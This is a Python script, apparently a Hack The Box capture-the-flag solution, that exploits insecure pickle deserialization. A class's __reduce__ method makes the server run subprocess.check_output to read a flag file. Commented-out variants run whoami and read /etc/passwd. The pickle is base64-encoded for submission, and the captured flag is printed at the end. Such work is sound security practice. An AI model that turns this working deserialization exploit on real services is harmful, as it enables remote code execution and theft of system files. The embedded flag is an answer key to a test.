import pickle
import os
import base64
import subprocess
import sys

'''
(dp0
S'serum'
p1
ccopy_reg
_reconstructor
p2
(c__main__
anti_pickle_serum
p3
c__builtin__
object
p4
Ntp5
Rp6
s.

'''

# Note: This needs to have the object parameter passed
# Note 2: This is python2, althought I'm still not sure how I could have leaked the version beforehand
class anti_pickle_serum(object):
 
    def __reduce__(self):
        #return subprocess.check_output, (["whoami"],)
        #return os.system, (['cat /etc/passwd'],)
        #return open, ('/etc/passwd', 'r') # <-- this works
        #return subprocess.check_output, (["ls"],)
        return subprocess.check_output, (["cat", "./flag_wIp1b"],)


def main():
    data = {'test': 'test_data'}
    serialized_data = pickle.dumps(data, protocol=0)
    print(serialized_data)

    data = open('./notes.txt', 'r').read()[:-1]
    #print(data.encode())
    #des_data = pickle.loads(data.encode())
    #print(des_data)

    # Basically, we get deserialized into an anti_pickle_serum object
    # What is getting called in the object?
    # Is there a way to get code execution from the way that this object is called?

    my_pickle = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
    #my_pickle = pickle.dumps({'serum': 'hello'}) # causes as server crash as depickling a nonpickle object is disallowed
    # What else can I try
    print(my_pickle)
    b64_pickle = base64.urlsafe_b64encode(my_pickle)
    print("b64 val: ")
    print(b64_pickle.decode())
    

    

if __name__ == '__main__':
    main()
    # Flag: HTB{g00d_j0b_m0rty...n0w_I_h4v3_to_g0_to_f4m1ly_th3r4py..}
